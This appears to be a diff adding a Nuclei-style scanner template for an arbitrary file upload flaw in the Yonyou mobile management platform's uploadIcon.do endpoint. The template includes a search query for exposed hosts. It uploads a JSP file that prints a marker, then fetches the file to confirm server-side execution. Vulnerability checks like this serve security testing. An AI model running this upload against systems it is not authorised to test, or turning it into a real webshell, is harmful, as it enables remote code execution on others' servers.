@@ -1,0 +1,50 @@
+id: yonyou-mobile-uploadIcon-fileupload
+info:
+  name: 用友移动系统管理平台 uploadIcon.do - fileupload
+  author: leadlife
+  severity: critical
+  description: 
+  reference: 
+    - https://wiki.wy876.cn/#/%E7%94%A8%E5%8F%8B%E7%A7%BB%E5%8A%A8%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E
+  metadata:
+    verified: true
+    fofa-query: app="用友-移动系统管理"
+  tags: yonyou,mobile,fileupload,oa
+
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+  boundary: "{{to_lower(rand_base(20))}}"
+
+http:
+  - raw:
+      - |
+        POST /maportal/appmanager/uploadIcon.do HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+        Accept-Encoding: gzip
+        Content-Type: multipart/form-data; boundary=----{{boundary}}
+        
+        ------{{boundary}}
+        Content-Disposition: form-data; name="iconFile"; filename="{{filename}}.jsp"
+        Content-Type: application/msword
+        
+        
+        <% out.print(111*111); %>
+        ------{{boundary}}--
+
+      - |
+        GET /maupload/img/{{filename}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains((body_2), '12321')"
+        condition: and
+
+    extractors:
+      - type: dsl
+        dsl:
+          - body_2
